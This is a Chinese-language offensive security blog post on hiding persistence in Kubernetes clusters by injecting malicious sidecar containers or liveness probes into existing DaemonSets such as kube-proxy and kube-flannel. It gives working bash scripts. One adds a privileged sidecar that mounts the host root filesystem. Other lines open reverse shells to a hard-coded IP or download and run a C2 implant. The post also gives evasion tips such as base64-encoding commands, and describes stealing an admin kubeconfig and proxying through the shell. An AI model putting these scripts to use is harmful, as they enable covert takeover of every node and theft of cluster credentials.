---
title: "k8s权限维持-动态容器注入"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 动态容器注入-一种隐蔽的k8s权限维持方法

恶意pod->反弹shell->挂载宿主机(node)/->cron写定时任务反弹shell->master-node

k8s控制器

众所周知，k8s的持久化有很多方法：

* 部署后门pod
* 部署cronjob
* 部署shadowApiserver
* 部署恶意deployment
* 部署恶意deamonset

这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？

这里就有一种叫做动态容器注入的方式

目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中

## 利用sidecar容器技术进行注入

这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/

这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod

为什么选择daemonset：

* 它能够确保所有节点（包括新增节点）上都运行一个Pod

* 如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod

值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：

* 容器是特权的（相当于docker run的时候带了–privileged选项）

* 容器与宿主机共享网络和PID命名空间（打破命名空间隔离）

* 容器内挂载宿主机根目录（打破文件系统隔离）

这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了

### 基础注入

一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：

我们探测一下是否存在kube-proxy：

~~~sh
kubectl get daemonset -n kube-system
~~~

![QQ_1759568770178](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759568770178.png)

我们也可以看到这个daemonset控制的pod：

![QQ_1759569016043](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569016043.png)

接下来我们来读这个daemonset的yaml：

~~~sh
kubectl get daemonset -n kube-system -o yaml
~~~

![QQ_1759569170555](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569170555.png)

我们可以在这个yaml基础上进行修改实现注入：

* 我们先分析原yaml的spec：

  ~~~yaml
    spec:
      revisionHistoryLimit: 10
      selector:
        matchLabels:
          k8s-app: kube-proxy
      template:
        metadata:
          creationTimestamp: null
          labels:
            k8s-app: kube-proxy
        spec:
          containers:
          - command:
            - /usr/local/bin/kube-proxy
            - --config=/var/lib/kube-proxy/config.conf
            - --hostname-override=$(NODE_NAME)
            env:
            - name: NODE_NAME
              valueFrom:
                fieldRef:
                  apiVersion: v1
                  fieldPath: spec.nodeName
            image: registry.k8s.io/kube-proxy:v1.30.14
            imagePullPolicy: IfNotPresent
            name: kube-proxy
            resources: {}
            securityContext:
              privileged: true
            terminationMessagePath: /dev/termination-log
            terminationMessagePolicy: File
            volumeMounts:
            - mountPath: /var/lib/kube-proxy
              name: kube-proxy
            - mountPath: /run/xtables.lock
              name: xtables-lock
            - mountPath: /lib/modules
              name: lib-modules
              readOnly: true
          dnsPolicy: ClusterFirst
          hostNetwork: true
          nodeSelector:
            kubernetes.io/os: linux
          priorityClassName: system-node-critical
          restartPolicy: Always
          schedulerName: default-scheduler
          securityContext: {}
          serviceAccount: kube-proxy
          serviceAccountName: kube-proxy
          terminationGracePeriodSeconds: 30
          tolerations:
          - operator: Exists
          volumes:
          - configMap:
              defaultMode: 420
              name: kube-proxy
            name: kube-proxy
          - hostPath:
              path: /run/xtables.lock
              type: FileOrCreate
            name: xtables-lock
          - hostPath:
              path: /lib/modules
              type: ""
            name: lib-modules
      updateStrategy:
        rollingUpdate:
          maxSurge: 0
          maxUnavailable: 1
        type: RollingUpdate
  ~~~

  我们只需要在此基础上增加两个新对象：

  - 一个新 `volume`（hostPath=/，把整个宿主机根目录挂进来）
  - 一个新 `container`（sidecar，名字/镜像看似正常，实际跑恶意命令）

  那么我们可以写一个自动注入脚本，实现注入一个挂载宿主机根目录并且启动时会执行反弹shell的sidecar‘容器：

  ~~~sh
  #!/usr/bin/env bash
  # inject-cache.sh -- 自动提取原yaml并注入“cache”边车容器
  # 用法：./inject-cache.sh 
  
  set -e
  
  #################### 1. 自动提取原yaml ####################
  image=$(kubectl -n kube-system get ds kube-proxy -o yaml \
          | awk '$1=="image:"{print $2}' | head -n1)
  
  #################### 2. 固定变量 ####################
  volume_name=cache
  mount_path=/var/kube-proxy-cache
  ctr_name=kube-proxy-cache
  
  #################### 3. 构建注入部分 ####################
  volume_block="\
        - name: ${volume_name}\n\
          hostPath:\n\
            path: /\n\
            type: Directory"
  
  container_block="\
        - name: ${ctr_name}\n\
          image: alpine:latest\n\
          imagePullPolicy: IfNotPresent\n\
          command: [\"/bin/sh\"]\n\
          args:\n\
          - -c\n\
          - 'set -x; nc 8.156.69.160 2333 -e /bin/sh & tail -f /dev/null'\n\
          securityContext:\n\
            privileged: true\n\
          volumeMounts:\n\
          - mountPath: ${mount_path}\n\
            name: ${volume_name}"
  
  #################### 4. 使用 awk 注入并滚动更新 ####################
  kubectl  -n kube-system get ds kube-proxy -o yaml \
  | awk -v vb="$volume_block" -v cb="$container_block" '
      /^      volumes:/   { print; print vb; next }
      /^      containers:/ { print; print cb; next }
      1
  ' \
  | kubectl replace -f -
  
  echo "[+] Injection done, waiting for rollout..."
  kubectl -n kube-system rollout status ds/kube-proxy
  echo "[+] All nodes now run the cache container with host root at ${mount_path} and privileged=true"
  ~~~

* 在vps上监听，并在master节点上执行脚本：
  ![QQ_1759586930293](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759586930293.png)

  可以看到注入成功，挂载的宿主机根目录位于/var/kube-proxy-cache

* vps成功收到反弹shell且能访问宿主机：

  ![QQ_1759586763452](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759586763452.png)

* 此时在master节点查看被注入后的kube-proxy，可以看到只有数量增加了，相当隐蔽：

  ![QQ_1759587392587](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759587392587.png)

### 思路优化

值得一提的是，我们知道名为kube-proxy的daemonset控制了每个节点上的kube-proxy相关pod，那么我们在进行注入后，每个节点上的kube-proxy相关pod都会增加一个恶意的sidecar容器，也就是说：**我们也可以通过此方法一次性获得每个节点上恶意容器的反弹shell，再逃逸即可获得所有node节点权限，较为方便**

那么这里就又有问题了：使用nc来监听反弹的shell，一次只能接受一个，所以如果按照上面脚本的方法来让所有恶意容器反弹shell不是一个好办法，于是我们可以尝试使用c2木马来进行上线

并且c2上线还有个好处：

> 一旦由于操作不当等原因不小心断开了一个反连的shell，对应Pod将运行结束，DaemonSet监测到Pod退出，将自动在相同节点上重建一个新Pod，我们就能够在c2上重新收获一个反弹shell，可以很好的提升可用性

那么最简单、通用的修改方式就是改注入脚本的container_block片段，把反弹shell的命令改为访问我们的vps，下载并执行木马：
~~~sh
container_block="\
      - name: ${ctr_name}\n\
        image: alpine:latest\n\
        imagePullPolicy: IfNotPresent\n\
        command: [\"/bin/sh\"]\n\
        args:\n\
        - -c\n\
        - 'set -x; wget http://<IP:PORT>/kube-proxy -O /root/kube-proxy && chmod 777 /root/kube-proxy && /root/kube-proxy'\n\
        securityContext:\n\
          privileged: true\n\
        volumeMounts:\n\
        - mountPath: ${mount_path}\n\
          name: ${volume_name}"
~~~

这样在master节点执行脚本后，就能一次性将k8s内的所有节点的kube-proxy注入容器上线C2：
![image-20251005164950032](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251005164950032.png)

另外大家可以进一步思考，比如如何针对自己不同的C2实现不同的无文件落地上线方案，这里就不多研究了

## 利用存活探针技术进行注入

### 基础注入

那么上面的方案还有其他值得注意的问题吗？当然，使用sidecar容器注入会导致pod显示的容器数量增加，不好绕过细致的排查；另外，可以注意到上面注入容器的时候，我们拉取了新的镜像`alpine:latest`，那如果当前内网环境中不允许从外部拉取容器呢？

这里就可以用到一个新的思路：利用探针

探针是在容器运行周期中触发的一个检测机制，探针的详细介绍可以在官方文档看到：https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/

探针有三种，其中存活探针可以在容器整个生命周期中持续触发，那么我们可以尝试通过存活探针来实现不拉取镜像的动态容器注入：

* 使用存活探针的exec检查模式实现命令执行反弹shell
* 使用探针参数`failureThreshold: 2147483647`，设置最大的失败重试次数，实现几乎“无限次”重复执行
* 使用`periodSeconds: x`参数来设置间隔为x秒

为了方便反弹shell，首先需要找到所以daemonset控制的pod是否有bash或perl等语言解释器，我们可以使用这样一个脚本来寻找：

~~~sh
for ds in $(kubectl get daemonsets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'); do
  ns=$(echo $ds | cut -d/ -f1)
  name=$(echo $ds | cut -d/ -f2)

  # 获取 selector 的键值对数组
  keys=$(kubectl get daemonset $name -n $ns -o jsonpath='{.spec.selector.matchLabels}' | tr -d '{}' | tr ',' '\n' | awk -F: '{gsub(/"/,"",$1); gsub(/"/,"",$2); print $1"="$2}')
  
  # 拼接成 label selector 字符串
  selector=""
  for k in $keys; do
    if [ -z "$selector" ]; then
      selector="$k"
    else
      selector="$selector,$k"
    fi
  done

  # 获取 Pod
  pod=$(kubectl get pods -n $ns -l "$selector" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)

  if [ -z "$pod" ]; then
    echo "No pod found for $ns/$name, skipping..."
    continue
  fi

  echo "Checking interpreters in $ns/$name ($pod):"
  for interpreter in sh bash python3 python node perl ruby; do
    kubectl exec -n $ns $pod -- which $interpreter &>/dev/null && echo "  $interpreter found"
  done
done
~~~

比如这里通过上面的脚本发现两个有bash，有一个甚至有perl：
![QQ_1760005958077](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760005958077.png)

由于kube-flannel/kube-flannel-ds更为常见，所以我们从这个pod下手，首先查看其daemonset的yaml的spec字段：
~~~yaml
spec:
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      app: flannel
  template:
    metadata:
      creationTimestamp: null
      labels:
        app: flannel
        tier: node
    spec:
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
            - matchExpressions:
              - key: kubernetes.io/os
                operator: In
                values:
                - linux
      containers:
      - args:
        - --ip-masq
        - --kube-subnet-mgr
        command:
        - /opt/bin/flanneld
        env:
        - name: POD_NAME
          valueFrom:
            fieldRef:
              apiVersion: v1
              fieldPath: metadata.name
        - name: POD_NAMESPACE
          valueFrom:
            fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
        - name: EVENT_QUEUE_DEPTH
          value: "5000"
        image: docker.io/flannel/flannel:v0.25.1
        imagePullPolicy: IfNotPresent
        name: kube-flannel
        resources:
          requests:
            cpu: 100m
            memory: 50Mi
        securityContext:
          capabilities:
            add:
            - NET_ADMIN
            - NET_RAW
          privileged: false
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /run/flannel
          name: run
        - mountPath: /etc/kube-flannel/
          name: flannel-cfg
        - mountPath: /run/xtables.lock
          name: xtables-lock
      dnsPolicy: ClusterFirst
      hostNetwork: true
      initContainers:
      - args:
        - -f
        - /flannel
        - /opt/cni/bin/flannel
        command:
        - cp
        image: docker.io/flannel/flannel-cni-plugin:v1.4.1-flannel1
        imagePullPolicy: IfNotPresent
        name: install-cni-plugin
        resources: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /opt/cni/bin
          name: cni-plugin
      - args:
        - -f
        - /etc/kube-flannel/cni-conf.json
        - /etc/cni/net.d/10-flannel.conflist
        command:
        - cp
        image: docker.io/flannel/flannel:v0.25.1
        imagePullPolicy: IfNotPresent
        name: install-cni
        resources: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /etc/cni/net.d
          name: cni
        - mountPath: /etc/kube-flannel/
          name: flannel-cfg
      priorityClassName: system-node-critical
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: flannel
      serviceAccountName: flannel
      terminationGracePeriodSeconds: 30
      tolerations:
      - effect: NoSchedule
        operator: Exists
      volumes:
      - hostPath:
          path: /run/flannel
          type: ""
        name: run
      - hostPath:
          path: /opt/cni/bin
          type: ""
        name: cni-plugin
      - hostPath:
          path: /etc/cni/net.d
          type: ""
        name: cni
      - configMap:
          defaultMode: 420
          name: kube-flannel-cfg
        name: flannel-cfg
      - hostPath:
          path: /run/xtables.lock
          type: FileOrCreate
        name: xtables-lock
  updateStrategy:
    rollingUpdate:
      maxSurge: 0
      maxUnavailable: 1
    type: RollingUpdate
~~~

经过分析其yaml可以得到注入脚本：

~~~sh
#!/usr/bin/env bash
# inject-flannel-probe.sh -- Insert malicious livenessProbe into kube-flannel DaemonSet (no temp files)
# Usage: ./inj_probe.sh

set -e

# bash built-in TCP socket (zero external commands)
PROBE_CMD='/bin/bash -i >& /dev/tcp/8.156.69.160/2333 0>&1'

PROBE_BLOCK="\
        livenessProbe:\n\
          exec:\n\
            command:\n            - /bin/bash\n\
            - -c\n\
            - '$PROBE_CMD'\n\
          initialDelaySeconds: 30\n\
          periodSeconds: 5\n\
          failureThreshold: 2147483647"

# ===== insert before first "volumeMounts:" in the first container =====
kubectl -n kube-flannel get ds kube-flannel-ds -o yaml \
| awk -v pb="$PROBE_BLOCK" '
    /^        [a-zA-Z].*:$/ && !done && $0 ~ /volumeMounts:/ {
        print pb; done=1
    }
    { print }
' \
| kubectl apply -f -

kubectl -n kube-flannel rollout status ds/kube-flannel-ds
echo "[+] Done"
~~~

上面是演示脚本，如果想要增加隐蔽性和可用性可以考虑下面的几点：

* 将命令编码，比如将明文的反弹shell命令改为base64解码后执行的命令，防止查看yaml时被一眼排查
* 修改参数`periodSeconds: 5`，这里是每 5 秒执行一次，可以适当增加时间间隔

* 由于是所有节点的被注入pod都会反弹shell，所以也可以考虑使用部分c2的一键上线命令增加可用性

在master节点运行脚本实现注入：
![QQ_1760007966340](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760007966340.png)

5秒后监听的vps会收到反弹shell：

![QQ_1760008096321](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760008096321.png)

并且被注入pod的容器数也不会有任何变化，相比sidecar更加隐蔽：

![QQ_1760065070968](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760065070968.png)

### 思路优化

虽然我们在上面可以得到kube-flannel的pod的shell，但和sidecar不同，由于这个容器不是我们主动创建的，所以我们不能自主的去除容器与宿主机隔离，那这样就显得很鸡肋了，连我们连node都摸不到有啥用

有没有能够提高可用性的方法呢，笔者在这里抛砖引玉：

我们在维持的时候既然已经控制了master节点，那么我们可以将其上面的高权限kubeconfig文件保存下来：

![](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760068484348-20251010123942590.png)

由于很多时候这种文件中证书允许的apiserver的ip都是内网IP，所以无法直接远程控制apiserver：

![QQ_1760071161676](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760071161676.png)

而我们又维持了kube-flannel控制的pod的shell，所以我们可以用这个shell做代理:

![QQ_1760071247498](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760071247498.png)

搭建代理之后即可在本地使用高权限kubeconfig文件来远程调用apiserver：

![QQ_1760072110174](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760072110174.png)

## 总结

总的来看，动态容器注入的本质就是通过修改daemonset的yaml实现新增sidecar容器或存活探针，来命令执行实现权限维持

当然，这里仅记录了笔者能想到的trick，如果有更好的办法欢迎在大家提出讨论

参考：

* [《k0otkit: Hack K8s in a K8s Way》](https://blog.wohin.me/posts/k0otkit/)
* 《ADCONF2025-云原生攻击路径》

